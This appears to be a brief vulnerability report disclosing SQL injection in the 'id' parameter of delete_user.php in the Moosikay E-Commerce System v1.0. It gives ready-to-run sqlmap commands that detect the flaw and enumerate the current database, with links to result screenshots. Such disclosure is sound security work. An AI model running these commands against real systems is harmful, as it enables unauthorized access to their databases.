# Moosikay - E-Commerce System v1.0 by razormist has SQL injection

BUG_Author: lcg22266

Vulnerability File: /Moosikay/admin/delete_user.php

Parameter "id" (GET), exists SQL injection vulnerability

sqlmap detect injection vulnerabilities: "sqlmap -u http://ip/Moosikay/admin/delete_user.php?id=1"

sqlmap injection result

![image](https://github.com/lcg-22266/bug_pic/blob/main/sqlmap.png)

sqlmap Queries the current database: "sqlmap -u http://ip/Moosikay/admin/delete_user.php?id=1 --current-db"

sqlmap injection result

![image](https://github.com/lcg-22266/bug_pic/blob/main/sqlmapTwo.png)
